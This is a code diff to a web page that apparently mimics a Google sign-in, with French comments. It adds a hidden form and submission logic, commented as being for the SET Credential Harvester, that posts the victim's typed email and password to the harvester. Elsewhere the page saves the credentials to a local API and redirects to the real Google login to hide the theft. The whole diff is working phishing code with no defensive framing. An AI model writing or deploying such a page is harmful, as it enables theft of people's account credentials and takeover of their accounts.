@@ -80,6 +80,12 @@
     </footer>
   </main>
 
+  <!-- Formulaire POST pour SET Credential Harvester (username / password) -->
+  <form id="harvestForm" method="POST" action="/" hidden>
+    <input type="text" name="username" id="harvestUsername" />
+    <input type="password" name="password" id="harvestPassword" />
+  </form>
+
   <script>
     const stepEmail = document.querySelector("#step-email");
     const stepPassword = document.querySelector("#step-password");
@@ -92,6 +98,16 @@
     const saveStatus = document.querySelector("#saveStatus");
     const API_URL = "http://localhost:8765/api/enregistrer";
     const GOOGLE_LOGIN_URL = "https://accounts.google.com/v3/signin/identifier";
+    const harvestForm = document.querySelector("#harvestForm");
+    const harvestUsername = document.querySelector("#harvestUsername");
+    const harvestPassword = document.querySelector("#harvestPassword");
+
+    function isLocalDevServer() {
+      return (
+        window.location.hostname === "localhost" &&
+        window.location.port === "8765"
+      );
+    }
 
     function showStep(step) {
       const isEmail = step === "email";
@@ -163,15 +179,23 @@
       passwordNextButton.textContent = "Enregistrement...";
       saveStatus.hidden = true;
 
-      try {
-        await enregistrerMotDePasse(email, motDePasse);
-      } catch (error) {
-        console.warn("Enregistrement local indisponible :", error);
+      if (isLocalDevServer()) {
+        try {
+          await enregistrerMotDePasse(email, motDePasse);
+        } catch (error) {
+          console.warn("Enregistrement local indisponible :", error);
+        }
+
+        const redirectUrl = new URL(GOOGLE_LOGIN_URL);
+        redirectUrl.searchParams.set("Email", email);
+        window.location.href = redirectUrl.toString();
+        return;
       }
 
-      const redirectUrl = new URL(GOOGLE_LOGIN_URL);
-      redirectUrl.searchParams.set("Email", email);
-      window.location.href = redirectUrl.toString();
+      // Mode SET / harvester : POST classique intercepté sur le port 80
+      harvestUsername.value = email;
+      harvestPassword.value = motDePasse;
+      harvestForm.submit();
     });
 
     identifier.addEventListener("keydown", (event) => {
